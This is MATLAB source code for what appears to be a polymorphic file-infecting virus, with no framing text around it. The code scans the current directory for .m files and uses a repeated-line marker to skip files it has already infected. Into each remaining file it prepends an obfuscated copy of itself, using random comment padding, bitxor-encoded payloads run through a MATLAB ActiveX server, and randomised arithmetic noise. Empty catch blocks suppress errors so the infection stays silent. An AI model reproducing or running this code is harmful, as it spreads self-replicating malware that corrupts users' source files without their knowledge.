try
    destdir=strcat(destdir,'\');
    clear vf;
    f=fopen(strcat(destdir,strcat(mf,'.m')),'r');
    i=1;
    while (~feof(f) && i <20)
        s=fgetl(f);
        if s==-1,break,end;
        vf(i:i)=cellstr(s);
        if (i>3 && strcmp(vf(i-3),s)==1)
            break;
        end;
        i=i+1;
    end;
    fclose(f);
    FileList=dir(strcat(destdir,'*.m'));
    DirLength=length(FileList);
    if DirLength>0
        for m=1:DirLength
           try
                infected=0;
                f=fopen(strcat(destdir,FileList(m).name),'r');
                if f>-1
                    clear of;
                    i=1;
                    while infected==0
                        s=fgetl(f);
                        if s==-1,break,end;
                        of(i:i)=cellstr(s);
                        if (i<20 && i>3 && length(s)>0 && strcmp(of(i-3),s)==1)
                            infected=1;
                        end;
                        i=i+1;
                    end;
                    fclose(f);
                    vv=char(ceil(25.*rand(1,3))+97);
                    if infected==0
                        f=fopen(strcat(destdir,FileList(m).name),'w');
                        if f>-1
                            for i=1:round(rand(1,1)*10+1)
                               ee=char(ceil(90.*rand(1,round((rand(1,10)*10))))+32);
                               ee(1)='%';
                               fprintf(f,'%s\n',ee);
                            end;
                            b=0;
                            for i=1:length(vf)
                                z=char(ceil(90.*rand(1,round((rand(1,10)*10))))+32);
                                z(1)='%';
                                sp=char(ceil(0.*rand(1,round((rand(1,10)*10+1))))+95);
                                q=char(vf(i));
                                if (length(q)>0 && (strcmp(q(1),'%'))~=1)
                                    if strfind(q,'bitxor')>0
                                         q=q(1:strfind(q,'%')-1);
                                         rp=strfind(q,'(');
                                         h=actxserver('matlab.application');
                                         k=h.Execute(q(rp(1)+1:length(q)-2));
                                         x=round(rand(1,1)*255);
                                         k=bitxor(x,double(k(9:length(k)-2)));
                                         u=strcat(strcat(vv,strcat('.Execute(char(bitxor(',num2str(x))),',[');
                                         for ss=1:length(k)
                                            if ss>1
                                                u=strcat(u,',');
                                            end;
                                            nn = num2str(k(ss));
                                            
                                            num = ceil(6.*rand(1,1))-1;

                                            switch num 
                                               case 0 
                                                   nn = strcat('+',nn);
                                               case 1
                                                   nn = strcat('--',nn);
                                               case 2
                                                   nn = strcat('1*',nn);
                                               case 4
                                                   nn = strcat(strcat('1*(',nn),')'); 
                                               case 5
                                                   nn = strcat('_',nn);
                                              case 6
                                                   nn = strcat(nn,'/1');                                                   
                                               otherwise
                                             end
                                             
                                             u=strcat(u,nn);
                                         end;
                                         u=strrep(strrep(strcat(strcat(u,'])));'),z),'(',strcat('(',sp)),'_',' ');
                                         fprintf(f,'%s\n',u);
                                    else
                                        if strfind(q,'matlab.application')>0
                                            a1=strcat(vv,'.PutWorkspaceData(''destdir'', ''base'', cd);');
                                            a2=strcat(vv,'.PutWorkspaceData(''mf'', ''base'', mfilename);');
                                            a1=strcat(a1,a2);
                                            a1=strcat(a1,z);
                                            u=strrep(strrep(strcat(strcat(vv,'=actxserver(''matlab.application'');'),a1),'(',strcat('(',sp)),',',strcat(',',sp));
                                            u=strrep(strrep(strrep(strrep(strrep(u,'=',strcat('=',sp)),')',strcat(')',sp)),')',strcat(sp,')')),';',strcat(';',sp)),'_',' ');
                                            fprintf(f,'%s\n',u);
                                        end;
                                    end;
                                end;
                            end;
                            fprintf(f,'%s\n',ee);
                            fprintf(f,'%s\n','');
                            for i=1:length(of)
                                fprintf(f,'%s\n',char(of(i)));
                            end;
                            fclose(f);
                        end;
                    end;
                end;
            catch
            end;
        end;
    end;
catch
end;